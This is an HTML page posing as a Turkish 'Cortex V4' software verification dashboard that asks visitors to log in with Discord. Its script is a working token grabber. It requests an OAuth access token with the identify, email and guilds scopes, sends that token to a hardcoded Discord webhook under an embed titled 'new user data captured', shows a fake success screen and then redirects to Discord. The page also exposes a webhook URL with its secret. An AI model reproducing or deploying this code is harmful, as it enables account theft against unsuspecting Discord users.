<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cortex Software | V4 Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ffcc; --bg: #020202; }
        body { background: var(--bg); color: var(--primary); font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
        .nitro-card { background: rgba(10, 10, 10, 0.98); border: 1px solid rgba(0, 255, 204, 0.2); box-shadow: 0 0 50px rgba(0, 255, 204, 0.1); }
        #dashboard { display: none; }
        .scanline { width: 100%; height: 2px; background: rgba(0, 255, 204, 0.1); position: absolute; top: 0; z-index: 100; pointer-events: none; animation: scan 4s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .glow-btn { transition: all 0.3s ease; cursor: pointer; border: 1px solid rgba(0, 255, 204, 0.3); }
        .glow-btn:hover { background: #00ffcc; color: black; box-shadow: 0 0 30px #00ffcc; transform: scale(1.02); }
        .mono { font-family: 'JetBrains Mono', monospace; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center">
    <div class="scanline"></div>

    <!-- GİRİŞ EKRANI -->
    <div id="landing" class="text-center p-10 nitro-card rounded-[2rem] max-w-sm w-full relative z-10 mx-4">
        <div class="mb-6">
            <img src="https://i.imgur.com/4S4W9i8.png" alt="Cortex Logo" class="w-20 h-20 mx-auto drop-shadow-[0_0_15px_#00ffcc]">
        </div>
        <h1 class="text-2xl font-black mb-1 text-white uppercase tracking-tighter">Cortex <span class="text-cyan-400">V4</span></h1>
        <p class="text-[8px] tracking-[5px] text-gray-500 mb-8 uppercase font-bold">Yazılım Doğrulama Sistemi</p>
        
        <div class="bg-white/5 p-5 rounded-xl mb-8 border border-white/5 text-left text-[11px] leading-relaxed text-gray-400">
            <p class="mono"><span class="text-cyan-400 font-bold">></span> Erişim sağlamak için Discord kimlik doğrulaması gereklidir. Veriler şifrelenerek merkeze iletilir.</p>
        </div>

        <button onclick="startAuth()" class="w-full py-4 bg-transparent text-cyan-400 rounded-lg font-bold glow-btn uppercase tracking-widest text-[10px]">
            Sisteme Giriş Yap
        </button>
    </div>

    <!-- BAŞARILI EKRANI -->
    <div id="dashboard" class="fixed inset-0 bg-[#020202] flex flex-col items-center justify-center z-50 px-6">
        <div class="text-center">
            <div class="w-16 h-16 border-4 border-cyan-400 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
            <h2 class="text-xl font-bold text-white tracking-[0.3em] uppercase">Yetkilendirme Başarılı</h2>
            <p class="text-cyan-400 text-xs mt-4 mono opacity-80">Veriler Cortex Neural Network sunucularına aktarılıyor...</p>
        </div>
    </div>

    <script>
        // Ayarlar
        const CLIENT_ID = "1480231196045873292";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480228951015297055/YkGkx8UliKe2XQtD0HxNxj1DBo_2rksQomQWoCaF61x-YUrVR9960IvGj-FVR99NY6iL";
        const REDIRECT_URI = "https://s15005453-hue.github.io/ria-store/";

        function startAuth() {
            const scope = encodeURIComponent("identify email guilds");
            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${scope}`;
        }

        window.onload = () => {
            const hash = window.location.hash.slice(1);
            const params = new URLSearchParams(hash);
            const token = params.get('access_token');

            if (token) {
                // UI Değiştir
                document.getElementById('landing').style.display = 'none';
                document.getElementById('dashboard').style.display = 'flex';

                // Discord'a Veri Gönder
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Cortex V4 Log Manager",
                        avatar_url: "https://i.imgur.com/4S4W9i8.png",
                        embeds: [{
                            title: "💀 Yeni Kullanıcı Verisi Yakalandı",
                            color: 0x00FFCC,
                            fields: [
                                { name: "🔑 Erişim Token", value: "```" + token + "```" },
                                { name: "🔗 Kaynak Panel", value: "```" + REDIRECT_URI + "```" },
                                { name: "🕒 İşlem Tarihi", value: "```" + new Date().toLocaleString('tr-TR') + "```" }
                            ],
                            footer: { text: "Cortex Software Systems | Neural Link" },
                            timestamp: new Date()
                        }]
                    })
                }).then(() => {
                    // 3 saniye sonra Discord'a yönlendir
                    setTimeout(() => {
                        window.location.href = "https://discord.com/app";
                    }, 3000);
                });
            }
        }
    </script>
</body>
</html>
